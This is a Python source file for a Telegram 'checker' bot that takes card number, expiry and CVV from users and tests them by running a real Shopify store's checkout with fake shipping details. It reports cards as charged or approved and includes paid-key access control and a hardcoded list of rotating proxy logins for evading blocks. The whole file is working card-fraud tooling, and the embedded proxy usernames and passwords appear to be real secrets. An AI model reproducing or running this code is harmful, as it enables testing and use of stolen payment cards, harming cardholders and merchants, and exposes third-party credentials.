import requests
from pyrogram import Client
from pyrogram import filters
import time
import asyncio
import aiohttp
import random
import string
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import re
from aiohttp_proxy import ProxyConnector
import aiohttp
import os
from datetime import datetime
from gates.functions.func_imp import get_time_taken
from gates.functions.func_imp import auto_ext
from gates.functions.func_imp import find_between
from pyrogram import Client, filters
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async

async def response_sh(textoo):
	if 'Invalid card verification number' in textoo or 'Thank you for your purchase!' in textoo:
		return 'APPROVED ✅'
	
	else:
		return 'DECLINED ❌'

prrox = [
				'http://qkdtrrcx-rotate:2ur8c9ajow1w@p.webshare.io:80/',
				'http://wiaevqoy-rotate:8cchty7lq6uz@p.webshare.io:80/',
				'http://ckpqqagy-rotate:tayu9gg6dos6@p.webshare.io:80/',
				'http://urfhspqv-rotate:r7n6p28puxxq@p.webshare.io:80/',
				'http://dqcnwsxr-rotate:wynsge2k4ecm@p.webshare.io:80/',
				'http://cqbxjdwf-rotate:5aj4nh5oh9g1@p.webshare.io:80/',
				'http://yixupsyx-rotate:k0890u62cf0z@p.webshare.io:80/',
				'http://edspwabx-rotate:t2huelcmdc1y@p.webshare.io:80/',
				'http://qwzhhbyc-rotate:y65ea6osrvyh@p.webshare.io:80/',
				'http://tiqzsrum-rotate:4uh17rettfkw@p.webshare.io:80/',
				'http://scoccvnt-rotate:kp30swm1lxp2@p.webshare.io:80/',
				'http://ewrnkwjt-rotate:cb5gvs87u5mp@p.webshare.io:80/',
				'http://sxhgrqjh-rotate:ta7pcilzgw4l@p.webshare.io:80/',
				'http://onrgncdd-rotate:av3wnkjlyg8i@p.webshare.io:80/',
				'http://vrxijuld-rotate:jmcidcidmd9l@p.webshare.io:80/',
				]
			
proxys = random.choice(prrox)
connector = ProxyConnector.from_url(proxys)
client_timeout = aiohttp.ClientTimeout(total=10)

def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None


def getstr(length):
    letters = string.ascii_letters + string.digits
    rst = ''.join(random.choice(letters) for i in range(length))
    return rst

def bet( data, first, last):
   try:
     start = data.index( first ) + len( first)
     end = data.index( last ,start)
     return data [start:end]
   except ValueError:
     return None
 
 
@Client.on_message(filters.command(["pr"]))
async def shopify(_, message):

    tiempo = time.time()

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "vtv"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="off comando porq porque si xd")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 50}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    alaa = f'''
<b>Command: <code>Braintree</code>
Gateway: <code>Sh + vtv</code></b>
Estados: <code>✅</code>
Format: <code>/vtv cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})
    ccs = True
    if not ccs:
            await message.reply("Invalid Card")
            return
    data = message.text.split(" ", 2)

    if len(data) < 2:
                await message.reply_text("Invalid Card")
                return
    
    ccs  = data[1]
    card = ccs.split("|")
    cc   = card[0]
    mes  = card[1]
    users = message.from_user.username
    ano = card[2]
    cvv = card[3]
    bin_code = cc[:6]
    x = get_bin_info (cc[0:6])


    session = requests.session()



    payload_1 = {
        'id': '41932176490701'
    }

    data = {
    'form_type': 'product',
    'utf8': '✓',
    'id': '41334338584730',
    'option-0': '3 Pair',
    'option-1': 'S/M',
    'option-2': 'Black',
}

    req1 = session.post(url=f'https://shopnicekicks.com/cart/add.js', data=payload_1, timeout=5)
    
    tk = getstr(86)

    req3 = session.get(url=f"https://shopnicekicks.com/checkout", timeout=5)
    checkout_url = req3.url

    headers = {

        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

    }

    payload_2 = f'_method=patch&authenticity_token={tk}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=juanpersaderes%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=rata&checkout%5Bshipping_address%5D%5Blast_name%5D=piroba&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=345+Street+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Altamont&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=12009&checkout%5Bshipping_address%5D%5Bphone%5D=%28805%29+473-5689&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Battributes%5D%5BI-agree-to-the-Terms-and-Conditions%5D=Yes&checkout%5Bclient_details%5D%5Bbrowser_width%5D=857&checkout%5Bclient_details%5D%5Bbrowser_height%5D=732&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'

    req4 = session.post(url=checkout_url, headers=headers, data=payload_2, timeout=5)

    payload_3 = f'_method=patch&authenticity_token={tk}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Flat%2520Rate-1000.00&checkout%5Battributes%5D%5BI-agree-to-the-Terms-and-Conditions%5D=Yes&checkout%5Bclient_details%5D%5Bbrowser_width%5D=871&checkout%5Bclient_details%5D%5Bbrowser_height%5D=732&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'

    req5 = session.post(url=checkout_url, headers=headers, data=payload_3, timeout=5)

    payload_4 = {
        "credit_card": {
            "number": f"{cc}",
            "name": "Idk Idk",
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "www.shopnicekicks.com"
    }
    
    req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, timeout=5)
    
    contra = await message.reply(f"""
<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", reply_to_message_id=message.id, disable_web_page_preview=True) 

    token = req6.json()

    id_ = token.get('id')


    payload_5 = f'_method=patch&authenticity_token={token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=6735901&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=4295&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=871&checkout%5Bclient_details%5D%5Bbrowser_height%5D=732&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'

    req7 =  session.post(url=checkout_url, headers=headers, data=payload_5, timeout=8)

    time.sleep(5)

    processing_url = req7.url

    req8 =  session.get(str(processing_url) + '?from_processing_page=1', timeout=5)

    time.sleep(5)

    req9 =  session.get(req8.url, timeout=5)

    text_resp =  req9.text

    resp = bet(text_resp, 'notice__text">', '<')

    if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

        resp = 'Charged'

    elif '/3d_secure_2/' in str(req9.url):

        resp = '3d_secure_2'

    elif resp =="Charged":
        res = "Charged ✅"
    elif resp =="Security code was not matched by the processor":
        res = "Approved CCN ✅"
    elif resp == "Street address and postal code do not match":
        res = "Approved ✅"
    elif resp == "No Match":
        res = "Approved ✅"
    else:
        res = "Declined ❌"
        

    await contra.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: <code>{res}</code></b> 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{resp}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Sh + pay </code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True)







